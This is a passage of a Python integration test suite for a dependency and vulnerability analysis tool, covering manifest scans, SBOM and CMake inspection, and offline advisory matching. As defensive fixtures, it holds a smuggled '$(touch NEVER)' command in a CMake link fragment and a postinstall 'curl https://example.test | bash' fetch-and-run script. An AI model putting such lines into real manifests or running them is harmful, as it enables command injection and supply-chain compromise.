        not conan["context"]["complete"],
        "Conan lock inventory became an active graph",
    )
    conan_record = await call(
        "explain_dependency", "conan-contexts", package="fmt", ecosystem="Conan"
    )
    resolutions = conan_record["resolutions"]
    check(
        len(resolutions) == 3
        and len({r["instance"] for r in resolutions}) == 3
        and {r["origin"]["context"] for r in resolutions}
        == {"requires", "build_requires"}
        and all(r["origin"]["activation"] == "unknown" for r in resolutions)
        and {
            r["location"]["line"]
            for r in resolutions
            if r["origin"]["context"] == "requires"
        }
        == {4, 5},
        "Conan lock instances, contexts or positions were lost",
    )
    conan_impact = await call(
        "dependency_impact", "conan-contexts", package="fmt", ecosystem="Conan"
    )
    check(
        not conan_impact["evidence_complete"],
        "Conan impact inferred an active build",
    )
    passed.append("conan-lock-contexts-and-activation-qualified")

    vcpkg = await call("scan_repository", "vcpkg-registry")
    check(
        not vcpkg["context"]["complete"],
        "vcpkg registry lock became package resolution",
    )
    vcpkg_record = await call(
        "explain_dependency", "vcpkg-registry", package="fmt", ecosystem="vcpkg"
    )
    declaration = vcpkg_record["declarations"][0]
    check(
        not vcpkg_record["resolved_versions"]
        and declaration["location"]["line"] == 2
        and declaration["marker"] == "windows"
        and declaration["metadata"]["minimum_version"] == "10.0"
        and declaration["metadata"]["features"]
        == [{"name": "unicode", "platform": "linux"}],
        "vcpkg conditions or minimum version changed meaning",
    )
    vcpkg_impact = await call(
        "dependency_impact", "vcpkg-registry", package="fmt", ecosystem="vcpkg"
    )
    check(
        not vcpkg_impact["evidence_complete"],
        "vcpkg impact inferred active features",
    )
    passed.append("vcpkg-registry-lock-and-feature-activation-qualified")
    conditional = await call(
        "explain_dependency",
        "vcpkg-registry",
        package="gtest",
        ecosystem="vcpkg",
    )
    assertion = conditional["declarations"][0]
    check(
        assertion["kind"] == "conditional"
        and len(conditional["declarations"]) == 2
        and {d["metadata"]["feature"] for d in conditional["declarations"]}
        == {"tests", "debugging"}
        and assertion["metadata"]["feature"] == "tests"
        and assertion["metadata"]["activation"] == "unknown"
        and assertion["metadata"]["default_feature_assertions"]
        == [{"name": "tests", "platform": "windows"}]
        and conditional["resolved_versions"] == []
        and not conditional["findings"],
        "Feature declaration became an active direct dependency or hygiene advice",
    )
    conditional_impact = await call(
        "dependency_impact",
        "vcpkg-registry",
        package="gtest",
        ecosystem="vcpkg",
    )
    check(
        conditional_impact["usage_count"] == 0
        and not conditional_impact["evidence_complete"],
        "Zero observed feature usage became removal evidence",
    )
    passed.append("vcpkg-feature-inventory-is-conditional")
    maven = await call("scan_repository", "maven-plugin")
    check(
        not maven["context"]["complete"],
        "Plugin configuration became a complete build graph",
    )
    plugin = await call(
        "explain_dependency",
        "maven-plugin",
        package="org.apache.maven.plugins:maven-compiler-plugin",
        ecosystem="Maven",
    )
    check(
        len(plugin["declarations"]) == 2
        and {d["metadata"]["maven_kind"] for d in plugin["declarations"]}
        == {"build-plugin", "plugin-management"}
        and all(
            d["kind"] == "conditional" and d["scope"] == "build"
            for d in plugin["declarations"]
        )
        and plugin["resolved_versions"] == []
        and not plugin["findings"],
        "Plugin management/configuration was promoted to installed application dependencies",
    )
    plugin_impact = await call(
        "dependency_impact",
        "maven-plugin",
        package="org.apache.maven.plugins:maven-compiler-plugin",
        ecosystem="Maven",
    )
    check(
        plugin_impact["usage_count"] == 0 and not plugin_impact["evidence_complete"],
        "Zero Java imports became plugin removal evidence",
    )
    passed.append("maven-plugin-configuration-is-not-execution")

    uncovered = await call("scan_repository", "uncovered")
    check(
        not uncovered["context"]["complete"]
        and bool(uncovered["context"]["coverage"]["uncovered"]),
        "An unsupported repository was reported complete",
    )
    passed.append("uncovered-manifest-context")

    components = await call("scan_repository", "components")
    check(
        not components["context"]["complete"]
        and any(
            d["code"] == "analysis.python-component-scope-ambiguous"
            for d in components["diagnostics"]
        ),
        "Disjoint Python components borrowed declarations",
    )
    component = await call("scan_repository", "components/a")
    check(
        any(f["code"] == "dependency.missing" for f in component["findings"]),
        "Component-root scan lost missing dependency evidence",
    )
    passed.append("python-component-root-boundary")


async def _check_snapshots_and_external_models(root, call, passed, scan):
    (root / "python" / "requirements.txt").write_text("requests==2.32.4\n")
    stale = await call("repository_context", "python")
    check(stale["stale"], "Manifest edit did not stale the index")
    refreshed = await call("scan_repository", "python")
    check(not refreshed["context"]["stale"], "Scan did not refresh the index")
    passed.append("refresh-after-manifest-change")

    snapshots = root / "python/.tmp"
    snapshots.mkdir()
    (snapshots / "before.json").write_text(json.dumps(scan))
    (snapshots / "after.json").write_text(json.dumps(refreshed))
    compared = await call(
        "compare_dependency_snapshots",
        "python",
        before_file=".tmp/before.json",
        after_file=".tmp/after.json",
    )
    check(
        compared["comparable"] and compared["counts"]["resolved_added"] == 1,
        "Snapshot comparison lost qualified version changes",
    )
    check(
        compared["capabilities"]["security"]["state"] == "incomplete"
        and not compared["remediation_verified"],
        "Offline comparison claimed remediation",
    )
    passed.append("qualified-read-only-snapshot-comparison")

    (snapshots / "bom.json").write_text(
        json.dumps(
            {
                "bomFormat": "CycloneDX",
                "specVersion": "1.7",
                "metadata": {"component": {"bom-ref": "app", "name": "application"}},
                "components": [
                    {
                        "bom-ref": "lock",
                        "name": "package-lock.json",
                        "type": "application",
                        "properties": [
                            {
                                "name": "aquasecurity:trivy:Class",
                                "value": "lang-pkgs",
                            },
                            {"name": "aquasecurity:trivy:Type", "value": "npm"},
                        ],
                    },
                    *[
                        {
                            "bom-ref": f"package-{i}",
                            "name": f"package-{i}",
                            "purl": f"pkg:npm/package-{i}@1.0.0",
                            "licenses": [{"license": {"id": "MIT"}}],
                            "properties": [
                                {
                                    "name": "source:path",
                                    "value": "package-lock.json",
                                }
                            ],
                        }
                        for i in range(2)
                    ],
                ],
                "dependencies": [
                    {"ref": "app", "dependsOn": ["lock"]},
                    {"ref": "lock", "dependsOn": ["package-0", "package-1"]},
                ],
            }
        )
    )
    sbom_original = (snapshots / "bom.json").read_bytes()
    index_original = (root / "python/.depcheck/index.sqlite3").read_bytes()
    sbom = await call(
        "inspect_dependency_sbom", "python", sbom_file=".tmp/bom.json", limit=2
    )
    check(
        sbom["total"] == 3 and sbom["next_offset"] == 2,
        "SBOM pagination failed",
    )
    final_page = await call(
        "inspect_dependency_sbom",
        "python",
        sbom_file=".tmp/bom.json",
        offset=2,
        limit=2,
    )
    check(
        len(final_page["components"]) == 1 and final_page["next_offset"] is None,
        "SBOM final page incorrect",
    )
    check(
        sbom["capabilities"]["usage"]["state"] == "unsupported"
        and sbom["capabilities"]["security"]["state"] == "skipped",
        "SBOM invented source/security evidence",
    )
    passed.append("external-sbom-provenance-and-pagination")
    group, package = sbom["components"]
    check(
        group["kind"] == "dependency-group"
        and group["direct"] is None
        and package["dependency_groups"] == ["lock"]
        and package["direct"] is None
        and package["licenses"] == [{"license": {"id": "MIT"}}]
        and package["properties"]
        == [{"name": "source:path", "value": "package-lock.json"}]
        and sbom["capabilities"]["inventory"]["state"] == "complete",
        "SBOM grouping or reported license/source evidence was lost",
    )
    check(
        (snapshots / "bom.json").read_bytes() == sbom_original
        and (root / "python/.depcheck/index.sqlite3").read_bytes() == index_original,
        "SBOM inspection changed source or the index",
    )
    passed.append("external-sbom-groups-and-license-assertions")

    cmake_reply = snapshots / "cmake-reply"
    cmake_reply.mkdir()
    cmake_version = {"major": 2, "minor": 9}
    cmake_bodies = {
        "index-selected.json": {
            "objects": [
                {
                    "kind": "codemodel",
                    "version": cmake_version,
                    "jsonFile": "model.json",
                }
            ]
        },
        "model.json": {
            "kind": "codemodel",
            "version": cmake_version,
            "paths": {"source": "/recorded", "build": "/recorded/build"},
            "configurations": [
                {
                    "name": "Debug",
                    "targets": [
                        {"id": "app::id", "name": "app", "jsonFile": "app.json"}
                    ],
                    "abstractTargets": [
                        {
                            "id": "vendor::id",
                            "name": "Vendor::lib",
                            "jsonFile": "vendor.json",
                        }
                    ],
                }
            ],
        },
        "app.json": {
            "id": "app::id",
            "name": "app",
            "type": "EXECUTABLE",
            "paths": {"source": ".", "build": "."},
            "codemodelVersion": cmake_version,
            "linkLibraries": [{"id": "vendor::id"}],
            "link": {
                "commandFragments": [{"role": "flags", "fragment": "$(touch NEVER)"}]
            },
        },
        "vendor.json": {
            "id": "vendor::id",
            "name": "Vendor::lib",
            "type": "INTERFACE_LIBRARY",
            "paths": {"source": "/foreign", "build": "/foreign"},
            "codemodelVersion": cmake_version,
            "abstract": True,
            "imported": True,
        },
    }
    for name, value in cmake_bodies.items():
        (cmake_reply / name).write_text(json.dumps(value))
    cmake_before = {
        path: (path.read_bytes(), path.stat().st_mtime_ns)
        for path in cmake_reply.iterdir()
    }
    cmake_rows = {key: [] for key in ("targets", "relationships", "input_files")}
    offset = 0
    while True:
        cmake = await call(
            "inspect_cmake_model",
            "python",
            index_file=".tmp/cmake-reply/index-selected.json",
            limit=1,
            offset=offset,
        )
        check(
            cmake["import_complete"] and not cmake["evidence_complete"],
            "CMake model completeness was overstated",
        )
        check(
            cmake["coverage"]["security"] == "skipped"
            and cmake["coverage"]["source_freshness"] == "unknown",
            "CMake assertions became verified source/security evidence",
        )
        for key, values in cmake_rows.items():
            values.extend(cmake[key])
        if cmake["next_offset"] is None:
            break
        offset = cmake["next_offset"]
    check(
        len(cmake_rows["targets"]) == 2
        and cmake_rows["targets"][1]["imported"]
        and cmake_rows["targets"][1]["abstract"],
        "CMake abstract/imported target identity was lost",
    )
    check(
        cmake_rows["relationships"][0]["kind"] == "linkLibraries"
        and cmake_rows["relationships"][0]["target_present"],
        "CMake direct linking was confused with build ordering",
    )
    check(
        len(cmake_rows["input_files"]) == 4,
        "CMake input-file pagination lost provenance",
    )
    check(
        all(
            (path.read_bytes(), path.stat().st_mtime_ns) == state
            for path, state in cmake_before.items()
        )
        and (root / "python/.depcheck/index.sqlite3").read_bytes() == index_original
        and not (root / "python/NEVER").exists(),
        "CMake inspection changed source/cache or executed a command",
    )
    passed.append(
        "external-cmake-model-qualified-linking-pagination-and-read-only-boundary"
    )
    return snapshots, index_original


async def _check_scoped_severity(root, call, passed, snapshots):
    # Constructed assertions check MCP transport and qualification, not vendor scores.
    score = {
        "type": "CVSS_V3",
        "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
    }
    excluded = {"type": "CVSS_V2", "score": "AV:L/AC:H/Au:M/C:N/I:N/A:P"}
    coordinate = {"ecosystem": "npm", "name": "package-0"}
    advisory = {
        "id": "OSV-SCOPED-SEVERITY-TRANSPORT-FIXTURE",
        "modified": "2026-10-23T00:00:00Z",
        "aliases": ["CVE-2026-12345"],
        "affected": [
            {
                "package": coordinate,
                "versions": ["1.0.0"],
                "severity": [score],
            },
            {
                "package": coordinate,
                "versions": ["3.0.0"],
                "severity": [excluded],
            },
        ],
    }
    advisory_path = snapshots / "scoped-severity-osv.json"
    for unknown_scope in (False, True):
        if unknown_scope:
            advisory["affected"].append({"package": coordinate, "severity": [excluded]})
        advisory_path.write_text(json.dumps(advisory))
        before = {
            path: (path.read_bytes(), path.stat().st_mtime_ns)
            for path in (
                snapshots / "bom.json",
                advisory_path,
                root / "python/.depcheck/index.sqlite3",
            )
        }
        result = await call(
            "reevaluate_vulnerabilities",
            "python",
            inventory_file=".tmp/bom.json",
            advisory_file=".tmp/scoped-severity-osv.json",
        )
        row = result["observations"][0]
        issue = row["vulnerabilities"][0]
        assertions = {item["field"]: item for item in issue["severity_assertions"]}
        check(
            row["status"] == "matched"
            and row["matching_complete"]
            and issue["cve_ids"] == ["CVE-2026-12345"]
            and issue["severity"] == [score]
            and issue["severity_status"]
            == ("incomplete" if unknown_scope else "reported")
            and assertions["/affected/0/severity"]["package"] == coordinate
            and assertions["/affected/0/severity"]["applicability"] == "affected"
            and assertions["/affected/1/severity"]["applicability"] == "not-affected"
            and all(
                item["advisory_id"] == advisory["id"] and item["reason"]
                for item in assertions.values()
            ),
            "Package severity lost its provenance, version scope or positive match",
        )
        if unknown_scope:
            check(
                assertions["/affected/2/severity"]["applicability"] == "unknown"
                and assertions["/affected/2/severity"]["severity"] == [excluded],
                "Unscoped severity was promoted or discarded",
            )
        check(
            result["read_only"]
            and result["global_vulnerability_coverage"] == "unknown"
            and all(
                (path.read_bytes(), path.stat().st_mtime_ns) == state
                for path, state in before.items()
            ),
            "Severity reevaluation changed supplied evidence/index or inferred coverage",
        )
        passed.append(
            "offline-scoped-severity-unknown-qualification"
            if unknown_scope
            else "offline-scoped-severity-provenance"
        )


async def _check_offline_security(root, call, passed, snapshots):
    (snapshots / "offline-osv.json").write_text(
        json.dumps(
            {
                "schema": "depcheck.osv-database.v1",
                "records": [
                    {
                        "id": "OSV-OFFLINE",
                        "modified": "2026-10-18T00:00:00Z",
                        "affected": [
                            {
                                "package": {
                                    "name": "package-0",
                                    "ecosystem": "npm",
                                },
                                "ranges": [
                                    {
                                        "type": "SEMVER",
                                        "events": [
                                            {"introduced": "0"},
                                            {"fixed": "2.0.0"},
                                        ],
                                    }
                                ],
                            }
                        ],
                    }
                ],
            }
        )
    )
    offline = await call(
        "reevaluate_vulnerabilities",
        "python",
        inventory_file=".tmp/bom.json",
        advisory_file=".tmp/offline-osv.json",
    )
    check(
        offline["observations"][0]["status"] == "matched"
        and offline["global_vulnerability_coverage"] == "unknown",
        "Offline corpus matching overstated coverage",
    )
    passed.append("offline-osv-supplied-inventory-scope")
    gem_inventory = snapshots / "gem-bom.json"
    gem_advisory = snapshots / "gem-osv.json"
    gem_inventory.write_text(
        json.dumps(
            {
                "bomFormat": "CycloneDX",
                "specVersion": "1.6",
                "components": [
                    {
                        "type": "library",
                        "bom-ref": str(index),
                        "name": "lodash-rails",
                        "purl": f"pkg:gem/lodash-rails@{version}",
                    }
                    for index, version in enumerate(["4.17.20.0", "4.17.21"])
                ],
            }
        )
    )
    gem_advisory.write_bytes(
        (
            Path(__file__).resolve().parents[3]
            / "test/fixtures/security/GHSA-35jh-r3h4-6jhm.json"
        ).read_bytes()
    )
    gem_originals = {
        p: (p.read_bytes(), p.stat().st_mtime_ns) for p in (gem_inventory, gem_advisory)
    }
    gem_index = root / "python/.depcheck/index.sqlite3"
    gem_index_before = gem_index.read_bytes(), gem_index.stat().st_mtime_ns
    gems = await call(
        "reevaluate_vulnerabilities",
        "python",
        inventory_file=".tmp/gem-bom.json",
        advisory_file=".tmp/gem-osv.json",
    )
    check(
        [r["status"] for r in gems["observations"]]
        == ["matched", "not-matched-in-supplied-records"]
        and gems["observations"][0]["vulnerabilities"][0]["fix_version"] == "4.17.21"
        and all(
            (p.read_bytes(), p.stat().st_mtime_ns) == value
            for p, value in gem_originals.items()
        )
        and (gem_index.read_bytes(), gem_index.stat().st_mtime_ns) == gem_index_before,
        "RubyGems native equality/fix boundary or read-only offline evidence changed",
    )
    passed.append("rubygems-advisory-native-versions-and-readonly-sbom")
    risk_database = json.loads((snapshots / "offline-osv.json").read_text())
    risk_database["records"][0]["aliases"] = ["CVE-2026-12345"]
    risk_database["records"][0]["related"] = ["CVE-2026-54321"]
    risk_osv = snapshots / "offline-risk-osv.json"
    risk_osv.write_text(json.dumps(risk_database))
    entry = {
        "cveID": "CVE-2026-12345",
        "vendorProject": "Synthetic",
        "product": "Fixture",
        "vulnerabilityName": "Synthetic record",
        "dateAdded": "2026-10-20",
        "shortDescription": "Test context",
        "requiredAction": "Review fixture",
        "dueDate": "2026-11-01",
        "knownRansomwareCampaignUse": "Unknown",
    }
    current_kev = {
        "catalogVersion": "2026.10.23",
        "dateReleased": "2026-10-23T19:30:18.9209Z",
        "count": 1,
        "vulnerabilities": [entry],
    }
    old_kev = {
        **current_kev,
        "dateReleased": "2026-10-23T17:00:09.9001Z",
        "count": 0,
        "vulnerabilities": [],
    }
    for filename, payload in [
        ("risk-kev.json", current_kev),
        ("risk-previous-kev.json", old_kev),
    ]:
        (snapshots / filename).write_text(json.dumps(payload))
    (snapshots / "risk-epss.csv").write_text(
        "#model_version:v2026.test,score_date:2026-10-23T12:55:00Z\ncve,epss,percentile\nCVE-2026-12345,0.1,0.9\nCVE-2026-54321,0.7,0.95\n"
    )
    (snapshots / "risk-previous-epss.csv").write_text(
        "#model_version:v2026.previous,score_date:2026-10-22T12:55:00Z\ncve,epss,percentile\nCVE-2026-12345,0.2,0.95\n"
    )
    before_risk = {
        path: (path.read_bytes(), path.stat().st_mtime_ns)
        for path in [
            risk_osv,
            snapshots / "bom.json",
            root / "python/.depcheck/index.sqlite3",
            *(
                snapshots / name
                for name in [
                    "risk-kev.json",
                    "risk-previous-kev.json",
                    "risk-epss.csv",
                    "risk-previous-epss.csv",
                ]
            ),
        ]
    }
    baseline = await call(
        "reevaluate_vulnerabilities",
        "python",
        inventory_file=".tmp/bom.json",
        advisory_file=".tmp/offline-risk-osv.json",
    )
    options = {
        "inventory_file": ".tmp/bom.json",
        "advisory_file": ".tmp/offline-risk-osv.json",
        "kev_file": ".tmp/risk-kev.json",
        "epss_file": ".tmp/risk-epss.csv",
        "previous_kev_file": ".tmp/risk-previous-kev.json",
        "previous_epss_file": ".tmp/risk-previous-epss.csv",
        "risk_as_of": "2026-10-24",
        "risk_max_age_days": 1,
    }
    enriched = await call("reevaluate_vulnerabilities", "python", **options)
    risk = enriched["risk_context"]
    (row,) = risk["records"]
    check(
        enriched["observations"] == baseline["observations"]
        and row["cve"] == "CVE-2026-12345"
        and row["kev"]["status"] == "listed"
        and row["kev"]["comparison"]["change"] == "added_to_snapshot"
        and row["kev"]["record"]["knownRansomwareCampaignUse"] == "Unknown"
        and row["epss"]["probability"] == 0.1
        and row["epss"]["percentile"] == 0.9
        and risk["finding_effect"] == "none"
        and risk["exploitation_status"] == "not-evaluated"
        and all(
            (p.read_bytes(), p.stat().st_mtime_ns) == state
            for p, state in before_risk.items()
        ),
        "Offline CVE risk context changed findings, guessed a related CVE or altered supplied inputs/cache",
    )
    epss_path = snapshots / "risk-epss.csv"
    epss_path.write_text(epss_path.read_text().replace(",0.7,", ",NaN,"))
    invalid_bytes = epss_path.read_bytes(), epss_path.stat().st_mtime_ns
    fallback = await call("reevaluate_vulnerabilities", "python", **options)
    check(
        fallback["observations"] == baseline["observations"]
        and fallback["risk_context"]["feeds"]["epss"]["stale"] is True
        and fallback["risk_context"]["feeds"]["epss"]["selection"] == "previous"
        and fallback["risk_context"]["records"][0]["epss"]["probability"] == 0.2,
        "Invalid full EPSS data did not retain the explicitly supplied previous snapshot",
    )
    options.pop("previous_epss_file")
    unavailable = await call("reevaluate_vulnerabilities", "python", **options)
    check(
        unavailable["observations"] == baseline["observations"]
        and unavailable["risk_context"]["records"][0]["epss"]["status"] == "unavailable"
        and "probability" not in unavailable["risk_context"]["records"][0]["epss"]
        and (epss_path.read_bytes(), epss_path.stat().st_mtime_ns) == invalid_bytes
        and all(
            (p.read_bytes(), p.stat().st_mtime_ns) == state
            for p, state in before_risk.items()
            if p != epss_path
        ),
        "Unavailable EPSS became zero or changed existing vulnerability/input evidence",
    )
    passed.append("cve-risk-read-only-alias-scope-probability-and-stale-fallback")
    (snapshots / "normalized-bom.json").write_text(
        json.dumps(
            {
                "bomFormat": "CycloneDX",
                "specVersion": "1.7",
                "components": [
                    {
                        "bom-ref": "demo",
                        "name": "demo",
                        "purl": "pkg:pypi/demo@1.0.0",
                    }
                ],
            }
        )
    )
    (snapshots / "normalized-osv.json").write_text(
        json.dumps(
            {
                "id": "OSV-NORMALIZED",
                "modified": "2026-10-18T00:00:00Z",
                "affected": [
                    {
                        "package": {"ecosystem": "PyPI", "name": "demo"},
                        "versions": ["1.0"],
                    },
                    {
                        "ranges": [
                            {
                                "type": "GIT",
                                "repo": "https://example.test/source",
                                "events": [{"introduced": "abc"}],
                            }
                        ]
                    },
                ],
            }
        )
    )
    normalized_osv = await call(
        "reevaluate_vulnerabilities",
        "python",
        inventory_file=".tmp/normalized-bom.json",
        advisory_file=".tmp/normalized-osv.json",
    )
    normalized_row = normalized_osv["observations"][0]
    check(
        normalized_row["status"] == "matched"
        and normalized_row["vulnerabilities"][0]["fix_version"] is None
        and "normalized" in normalized_row["advisory_checks"][0]["reason"]
        and normalized_osv["database"]["unmapped_affected_entries"] == 1,
        "OSV membership was tied to fix availability, or Git assertions lost",
    )
    passed.append("offline-osv-normalized-membership-without-forward-fix")
    await _check_scoped_severity(root, call, passed, snapshots)
    # Synthetic supplied assertions exercise transport semantics. Real advisory
    # bytes and independent labels are evaluated separately by the corpus gate.
    go_inventory = {
        "schema": "depcheck.scan.v1",
        "inventory": {
            "resolved_dependencies": [
                {
                    "identity": {
                        "ecosystem": "Go",
                        "package": "golang.org/x/net",
                        "version": version,
                        "instance": instance,
                    },
                    "origin": {"public": public},
                }
                for instance, version, public in (
                    ("affected", "v0.16.0", True),
                    ("fixed", "v0.17.0", True),
                    ("private", "v0.16.0", False),
                )
            ]
        },
    }
    go_advisory = {
        "id": "OSV-GO-TRANSPORT-FIXTURE",
        "modified": "2026-10-23T00:00:00Z",
        "affected": [
            {
                "package": {"ecosystem": "Go", "name": "golang.org/x/net"},
                "versions": ["v0.16.0"],
                "ranges": [
                    {
                        "type": "ECOSYSTEM",
                        "events": [{"introduced": "0"}, {"fixed": "0.17.0"}],
                    }
                ],
            }
        ],
    }
    go_input = snapshots / "go-inventory.json"
    go_record = snapshots / "go-advisory.json"
    go_input.write_text(json.dumps(go_inventory))
    for incomplete in (False, True):
        if incomplete:
            go_advisory["affected"].append(
                {"package": {"ecosystem": "Go", "name": "golang.org/x/net"}}
            )
        go_record.write_text(json.dumps(go_advisory))
        before = {
            path: (path.read_bytes(), path.stat().st_mtime_ns)
            for path in (go_input, go_record, root / "python/.depcheck/index.sqlite3")
        }
        go_result = await call(
            "reevaluate_vulnerabilities",
            "python",
            inventory_file=".tmp/go-inventory.json",
            advisory_file=".tmp/go-advisory.json",
        )
        affected, fixed, private = go_result["observations"]
        check(
            affected["status"] == "matched"
            and affected["matching_complete"]
            and affected["vulnerabilities"][0]["fix_versions"] == ["0.17.0"]
            and affected["vulnerabilities"][0]["fix_version"]
            == (None if incomplete else "0.17.0")
            and affected["vulnerabilities"][0]["fix_version_status"]
            == ("unknown" if incomplete else "candidate")
            and fixed["status"]
            == ("unknown" if incomplete else "not-matched-in-supplied-records")
            and private["status"] == "unknown"
            and go_result["global_vulnerability_coverage"] == "unknown",
            "Go supplied evidence lost membership, source qualification or fix uncertainty",
        )
        check(
            all(
                (path.read_bytes(), path.stat().st_mtime_ns) == state
                for path, state in before.items()
            ),
            "Go reevaluation changed supplied files or the index",
        )
        passed.append(
            "offline-go-incomplete-fix"
            if incomplete
            else "offline-go-native-versions-and-ecosystem-ranges"
        )
    (snapshots / "vex.json").write_text(
        json.dumps(
            {
                "@context": "https://openvex.dev/ns/v0.2.0",
                "@id": "urn:example:vex",
                "author": "fixture",
                "timestamp": "2026-10-18T00:00:00Z",
                "version": 1,
                "statements": [
                    {
                        "vulnerability": {"name": "OSV-OFFLINE"},
                        "products": [{"@id": "pkg:npm/package-0@1.0.0"}],
                        "status": "under_investigation",
                    }
                ],
            }
        )
    )
    vex = await call(
        "inspect_evidence", "python", evidence_file=".tmp/vex.json", kind="vex"
    )
    check(
        vex["records"][0]["status"] == "under_investigation"
        and vex["finding_effect"] == "none",
        "VEX asserted a trusted decision",
    )
    passed.append("external-vex-status-and-no-suppression")
    (snapshots / "calls.py").write_text(
        "def target():\n    pass\ndef main():\n    alias = target\n    alias()\n"
    )
    (snapshots / "calls.json").write_text(
        json.dumps(
            {
                "schema": "depcheck.python-call-analysis.v1",
                "sources": [{"path": ".tmp/calls.py", "module": "consumer"}],
                "entries": ["consumer:main"],
                "vulnerability_symbols": [
                    {"advisory_id": "EXTERNAL", "node_id": "consumer:target"}
                ],
            }
        )
    )
    calls_result = await call(
        "analyze_python_calls", "python", analysis_file=".tmp/calls.json"
    )
    check(
        calls_result["tables"]["assessments"][0]["path"]
        == ["consumer:main", "consumer:target"]
        and calls_result["metadata"]["coverage"]["state"] == "incomplete",
        "Static callable path/qualification lost",
    )
    passed.append("selected-python-callable-path-and-limits")

    (snapshots / "pip-inspect.json").write_text(
        json.dumps(
            {
                "version": "1",
                "pip_version": "25.3",
                "environment": {"sys_platform": "other"},
                "installed": [
                    {
                        "metadata": {"name": "demo", "version": "1.0"},
                        "metadata_location": "/not-opened/demo.egg",
                    },
                    {
                        "metadata": {"name": "demo", "version": "1.0"},
                        "metadata_location": "/not-opened/demo.dist-info",
                        "requested": False,
                        "installer": "pip",
                    },
                ],
            }
        )
    )
    native = await call(
        "inspect_evidence",
        "python",
        evidence_file=".tmp/pip-inspect.json",
        kind="pip-inspect",
        limit=1,
    )
    native_tail = await call(
        "inspect_evidence",
        "python",
        evidence_file=".tmp/pip-inspect.json",
        kind="pip-inspect",
        limit=1,
        offset=1,
    )
    check(
        native["counts"]["distributions"] == 2
        and "requested" not in native["tables"]["distributions"][0]
        and native_tail["tables"]["distributions"][0]["requested"] is False
        and native_tail["tables"]["distributions"][0]["public_identity_status"]
        == "unverified"
        and native["metadata"]["current_project_installation"] == "not-established"
        and native["finding_effect"] == "none",
        "Native pip inspect lost instances or promoted external assertions",
    )
    passed.append("native-pip-inspect-read-only-paging-and-assertion-boundary")
    (snapshots / "pip-install-report.json").write_text(
        json.dumps(
            {
                "version": "1",
                "pip_version": "25.3",
                "environment": {"sys_platform": "other"},
                "install": [
                    {
                        "metadata": {"name": "demo", "version": "1.0rc1"},
                        "download_info": {
                            "url": "https://files.pythonhosted.org/demo.whl",
                            "archive_info": {},
                        },
                        "requested": True,
                        "requested_extras": ["socks"],
                        "is_direct": False,
                    },
                    {
                        "metadata": {"name": "demo", "version": "1.0rc1"},
                        "download_info": {
                            "url": "file:///not-opened/demo",
                            "dir_info": {"editable": True},
                        },
                        "requested": False,
                        "is_direct": True,
                        "is_yanked": False,
                    },
                ],
            }
        )
    )
    plan = await call(
        "inspect_evidence",
        "python",
        evidence_file=".tmp/pip-install-report.json",
        kind="pip-install-report",
        limit=1,
    )
    plan_tail = await call(
        "inspect_evidence",
        "python",
        evidence_file=".tmp/pip-install-report.json",
        kind="pip-install-report",
        limit=1,
        offset=1,
    )
    first = plan["tables"]["distributions"][0]
    last = plan_tail["tables"]["distributions"][0]
    check(
        plan["counts"] == {"distributions": 2}
        and first["instance_id"] != last["instance_id"]
        and first["requested_extras"] == ["socks"]
        and "is_yanked" not in first
        and last["is_yanked"] is False
        and last["source_pointer"] == "/install/1"
        and first["installation_status"]
        == last["installation_status"]
        == "not-established; report-may-be-dry-run"
        and all(
            row["public_identity_status"] == "unverified" and "purl" not in row
            for row in (first, last)
        )
        and plan["metadata"]["current_project_installation"] == "not-established"
        and plan["finding_effect"] == "none",
        "pip installation report promoted a dry-run or download URL into installed/public identity",
    )
    passed.append("native-pip-install-report-preserves-dry-run-and-source-boundaries")


async def _check_external_exports(
    root, call, passed, snapshots, index_original, session, calls
):
    exported = await call(
        "export_evidence",
        "python",
        snapshot_file=".tmp/before.json",
        kind="provenance",
        input_files=[".tmp/calls.py"],
    )
    check(
        exported["predicate"]["signature_status"] == "unsigned",
        "Unsigned evidence became authenticated",
    )
    passed.append("unsigned-explicit-provenance-export")
    cross = await call(
        "compare_inventories",
        "python",
        before_file=".tmp/bom.json",
        after_file=".tmp/bom.json",
    )
    check(
        cross["total"] == 0 and cross["false_positive_rate"] is None,
        "Inventory comparison invented correctness rates",
    )
    passed.append("cross-producer-inventory-comparison-profile")
    (snapshots / "package-old.json").write_text('{"scripts":{}}')
    (snapshots / "package-new.json").write_text(
        '{"scripts":{"postinstall":"curl https://example.test | bash"}}'
    )
    behavior = await call(
        "compare_package_behavior",
        "python",
        before_file=".tmp/package-old.json",
        after_file=".tmp/package-new.json",
    )
    check(
        behavior["changes"][0]["after"]["lifecycle"]
        and behavior["maliciousness"] == "not-established",
        "Script capability became maliciousness claim",
    )
    names = await call(
        "compare_package_names",
        "python",
        package="requsets",
        references=["requests"],
        ecosystem="PyPI",
    )
    check(
        names["signals"][0]["mechanism"] == "adjacent-transposition"
        and not names["automatic_replacement"],
        "Name signal changed identity",
    )
    passed.append("package-behavior-and-name-advisories")
    denied = await session.call_tool(
        "verify_registry_package",
        {
            "project_root": str(root / "python"),
            "ecosystem": "PyPI",
            "package": "requests",
        },
    )
    check(bool(denied.isError), "Registry lookup accepted missing network opt-in")
    calls.append(
        {
            "name": "verify_registry_package",
            "arguments": {"allow_network": False},
            "expected_error": True,
        }
    )
    check(
        (root / "python/.depcheck/index.sqlite3").read_bytes() == index_original,
        "External evidence modified the index",
    )
    passed.append("registry-network-opt-in-and-external-read-only-cache")

    (snapshots / "qualified-bom.json").write_text(
        json.dumps(
            {
                "bomFormat": "CycloneDX",
                "specVersion": "1.7",
                "components": [
                    {
                        "bom-ref": "private",
                        "name": "tool",
                        "purl": "pkg:npm/%40Scope/LegacyTool@1?repository_url=https%3A%2F%2Fprivate.example#src",
                    }
                ],
            }
        )
    )
    qualified_original = (snapshots / "qualified-bom.json").read_bytes()
    qualified = await call(
        "inspect_dependency_sbom",
        "python",
        sbom_file=".tmp/qualified-bom.json",
    )
    identity = qualified["components"][0]["identity"]
    check(
        identity["package"] == "@Scope/LegacyTool"
        and identity["qualifiers"] == {"repository_url": "https://private.example"}
        and identity["subpath"] == "src"
        and qualified["capabilities"]["inventory"]["state"] == "incomplete"
        and qualified["capabilities"]["security"]["state"] == "skipped"
        and any(
            d["code"] == "sbom.identity-qualified" for d in qualified["diagnostics"]
        ),
        "SBOM lost qualified identity or claimed an unverified resolution",
    )
    check(
        (snapshots / "qualified-bom.json").read_bytes() == qualified_original
        and (root / "python/.depcheck/index.sqlite3").read_bytes() == index_original,
        "Qualified SBOM inspection changed source or the index",
    )
